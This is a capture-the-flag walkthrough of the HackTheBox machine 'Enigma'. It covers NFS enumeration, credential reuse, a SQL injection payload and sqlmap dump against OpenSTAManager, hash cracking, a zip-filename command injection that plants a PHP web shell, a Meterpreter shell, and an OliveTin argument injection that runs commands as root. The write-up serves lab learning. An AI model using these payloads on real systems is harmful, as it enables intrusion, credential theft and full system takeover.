# Enigma

Enigma is an easy-level HackTheBox Linux machine. 


Let's crack this guy.

## Reconnaisance  
  
First we begin with scanning the ports for any open ports and services. We see in the results there is no ssh. We also see that nfs is available via rpc. 

``` nmap -T4 -p- 10.129.239.191

nmap -T4 -p80,110,111,143,993,995,2049,36155,46261,57713,59953,60556 -A -sC -sV 10.129.239.191
```

We run a showmount on this IP and see that /srv/nfs/onboarding * is available for mounting. 
```
showmount -e 10.129.239.191                                                                   
```
## Foothold
  
We mount it and find in this directory a PDF file with a welcome letter for user Kevin. We also get some initial credentials and a hidden virtual host called "email001.enigma.htb"
```
sudo mount -t nfs 10.129.239.191:/srv/nfs/onboarding srv/nfs/onboarding -nolock               
```
  
Credentials:
kevin
Enigma2024!

We also see there's a hidden service hosting in a subdomain called "email001". 

We go to email001.enigma.htb to find a mailserver. 

In the inbox we see an email from Sarah, but nothing really valuable.

We decide to test the Enigma2024! password on the Sarah user and find that we have access to her account.

In her emails we see that IT created an admin account for the user in another hidden service (support_001.enigma.htb) and we are provided with the username and password.

```
URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s
```

We login and go to the system info page to find the app version. 
openstamanager 2.9.8 

We find this version of Openstamanager is vulnerable to sql injection via cve-2025-69216.

Using burp, we form the malicious request to http://support_001.enigma.htb/pdfgen.php?ptype=scadenzario&id_anagrafica=1%22%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,database(),0x7e))%20AND%20%221%22=%221

We get the database name. Then we try again but this time with the users
```
http://support_001.enigma.htb//pdfgen.php?ptype=scadenzario&id_anagrafica=1%22%20AND%20EXTRACTVALUE(0%2cCONCAT(0x7e%2c(SELECT%20SUBSTRING(password%20FROM%20zz_users%20LIMIT%201%2c4%2c10)%2c0x7e))%20AND%20%221%22%3d%221
```
Seeing how XPATH limits the length of the hash we extract from table zz_users, we will need to use sqlmap to dump the database. We save the Burp request to a file (in my case request2) and run sqlmap against it.
```
sqlmap -r request2 --level 3 --risk 3 --dbs -D openstamanager -T zz_users  --dump             

```
Doing this gives us the following credentials
```
admin@enigma.htb
Hash: $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu (bcrypt)

haris@enigma.htb 
hash: $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC (bcrypt)
```
We crack the hash for haris and get the password: bestfriends
```
john hash --wordlist/usr/share/wordlists/rockyou.txt
```
## RCE and Lateral Movement

We also find that this version of Openstamanager is also vulnerable to RCE via CVE-2025-69212

We use the POC python script to create a malicious zip file that, when submited, creates a file in the files directory called SHELL.PHP

``` 
  import zipfile

cmd = "cd files && echo '<?php system($_GET[\"c\"]); ?>' > SHELL.php"
malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")
```

We then inject code into the GET request to the c variable and upload a msfvenom shell, then execute it to get Meterpreter shell. 

We check /etc/passwd to see that the only users on the machine with login and /bin/bash use are root and haris. 

Luckily, we have haris's password. We use "su haris" and the password bestfriends to move laterally. We grab the user.txt flag. We also create another meterpreter shell to connect to the haris account.

  
We see in /opt a directory called OliveTin, and when we check what ports are listening we see that OliveTin is listening on port 1337, although our original nmap scan didn't see it. Must be hidden.

We set up port forwarding in meterpreter and access the services from our web browser. 
```
portfwd add -l 1337 -p 1337 -r 127.0.0.1
```
We see that this is OliveTin version 3000.10.0 which is vulnerable to RCE via CVE-2026-27626.

# Root  
We try the POC but it doesn't work. Using Burp, we analyze the requests for each of the available commands and see that backup_database has an argument called db_pass. 

We edit the request data to the following based on the POC we attempted before.
```
{"bindingId":"backup_database","arguments":[{"name":"db_user","value":"backup_svc"},{"name":"db_pass","value": "'; cat id; echo '"},{"name":"db_name","value":"production"}],"uniqueTrackingId":"3086bc06-f3ad-4a92-a9be-32a3cc630b16"}
```
We look in the logs at the command output and get the following

exit status 2

Usage: mysqldump [OPTIONS] database [tables]
OR     mysqldump [OPTIONS] --databases [OPTIONS] DB1 [DB2 DB3...]
OR     mysqldump [OPTIONS] --all-databases [OPTIONS]
For more options, use mysqldump --help
uid=0(root) gid=0(root) groups=0(root)
sh: 1: cannot create /opt/backups/backup.sql: Directory nonexistent

It worked! We see that the command is executed as root. From here we can either upload and execute another shell or just simply use RCE to grab the root flag. 
